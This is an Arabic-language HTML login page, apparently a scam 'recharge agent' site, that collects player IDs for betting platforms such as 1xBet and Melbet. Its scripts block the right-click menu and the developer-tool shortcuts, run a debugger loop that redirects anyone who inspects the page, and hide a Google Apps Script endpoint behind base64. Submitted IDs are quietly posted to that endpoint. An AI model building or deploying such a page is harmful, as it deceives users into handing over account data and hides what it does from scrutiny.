<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --header-height: 60px;
      --idbet-color: #e50914;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Tajawal', sans-serif;
      background: #f5f5f5;
      color: #333;
      user-select: none;
      -webkit-user-drag: none;
      -webkit-touch-callout: none;
    }
    header {
      height: var(--header-height);
      background: #fff;
      display: flex;
      align-items: center;
      padding: 0 16px;
      box-shadow: 0 1px 4px rgba(0, 0, 0, .05);
      border-bottom: 1px solid #eee;
    }
    .header-brand {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 500;
    }
    .idbet {
      color: var(--idbet-color);
      font-size: 1.1rem;
      font-weight: bold;
    }
    .separator {
      color: #ccc;
    }
    .slogan {
      color: #555;
      font-size: .9rem;
    }
    main {
      display: flex;
      justify-content: center;
      padding: 24px 12px;
    }
    .login-box {
      background: #fff;
      padding: 28px 20px;
      max-width: 400px;
      width: 100%;
      border-radius: 14px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, .06);
    }
    .title-wrapper {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.3rem;
      font-weight: bold;
      margin-bottom: 16px;
      color: #222;
    }
    .step-box {
      width: 32px;
      height: 32px;
      background: var(--idbet-color);
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* سيتم استكمال CSS في الجزء 2 */

  </style>
</head>
<body 
  oncontextmenu="return false"
  onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">

<script>
  // Anti-inspect protection
  setInterval(() => {
    const t = new Date().getTime();
    debugger;
    const d = new Date().getTime();
    if (d - t > 100) window.location.href = "https://google.com";
  }, 1000);
</script>

<header>
  <div class="header-brand">
    <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
  </div>
</header>
<main>
  <section class="login-box">
    <div class="title-wrapper">
      <div class="step-box">
        <svg viewBox="0 0 32 32" width="20" height="20" fill="white" xmlns="http://www.w3.org/2000/svg">
          <path d="M28 18.7c-.5-3.8-2-7.5-4.6-10.4C21.6 6 20 3.8 20 .7a.7.7 0 00-1-.6 17 17 0 00-6.3 9c-.5 2.3-.7 4.6-.7 6.8-2.7-.6-3.3-4.6-3.3-4.7a.7.7 0 00-1-.5c-.1.1-3.5 1.8-3.7 8.6v.7a12 12 0 0012 12 12 12 0 0012-13.3zm-12 12a4.1 4.1 0 01-4-4.3V26c0-.7.1-1.4.4-2a2.4 2.4 0 002.2 1.5.7.7 0 00.7-.6c0-1 0-2 .2-3 .3-1 .8-1.9 1.4-2.6.3.9.8 1.7 1.4 2.5 1 1.2 1.5 2.6 1.7 4.1v.4a4.1 4.1 0 01-4 4.3z"/>
        </svg>
      </div>
      <h2>تسجيل الدخول</h2>
    </div>
    <div class="input-label">
      <label for="player-id-1">معرّف اللاعب</label>
      <span class="info-icon" title="رقم مكوَّن من 7 إلى 15 رقمًا">?</span>
    </div>

    <div class="input-group">
      <div class="input-wrapper">
        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="15" />
        <div class="status-icon" id="status-icon"></div>
      </div>
      <div class="error-message" id="error-message"></div>
    </div>

    <div class="platform-icons" id="platforms">
      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
    </div>

    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
  </section>
</main>

<script>
  const input = document.getElementById('player-id-1');
  const errMsg = document.getElementById('error-message');
  const btn = document.getElementById('login-btn');
  const icons = document.querySelectorAll('.icon');
  const statusIcon = document.getElementById('status-icon');
  let platform = null;
  const repReg = /^(\d)\1{6,}$/;

  input.addEventListener('keydown', e => {
    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
  });

  input.addEventListener('input', validate);

  icons.forEach(icon => {
    icon.addEventListener('click', () => {
      icons.forEach(i => i.classList.remove('selected'));
      icon.classList.add('selected');
      platform = icon.dataset.name;
      validate();
    });
  });

  function validate() {
    const val = input.value.replace(/\D/g, '');
    input.value = val;
    errMsg.textContent = '';
    btn.disabled = true;

    if (val.length < 7) {
      statusIcon.style.display = 'none';
      statusIcon.className = 'status-icon';
      statusIcon.innerHTML = '';
      return;
    }

    statusIcon.style.display = 'flex';
    statusIcon.className = 'status-icon status-spinner';
    statusIcon.innerHTML = '';

    setTimeout(() => {
      if (repReg.test(val)) {
        errMsg.textContent = 'المعرّف غير صالح';
        statusIcon.style.display = 'none';
        return;
      }
      if (!platform) {
        errMsg.textContent = 'يرجى اختيار المنصة.';
        statusIcon.style.display = 'none';
        return;
      }

      btn.disabled = false;
      statusIcon.className = 'status-icon status-check';
      statusIcon.innerHTML = '✓';
    }, 500);
  }
  btn.addEventListener('click', async () => {
    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
    btn.disabled = true;
    const payload = { userId: input.value, platform: platform };

    // تشفير الرابط باستخدام base64 + مفتاح ثابت
    function decodeUrl(key) {
      const base = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==";
      return atob(base) + key;
    }

    const scriptURL = decodeUrl("AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec");

    try {
      await fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      // تخزين معلومات الدخول المؤقت
      localStorage.setItem('userId', input.value);
      sessionStorage.setItem('authorized', 'true');

      setTimeout(() => {
        window.location.href = 'fr/office/recharge.html';
      }, 1200);
    } catch (err) {
      errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
      btn.innerHTML = 'تأكيد';
      btn.disabled = false;
    }
  });

  window.addEventListener('pageshow', () => {
    btn.disabled = true;
    btn.innerHTML = 'تأكيد';
    errMsg.textContent = '';
    input.value = '';
    platform = null;
    statusIcon.style.display = 'none';
    statusIcon.className = 'status-icon';
    statusIcon.innerHTML = '';
    icons.forEach(i => i.classList.remove('selected'));
  });
</script>

</body>
</html>
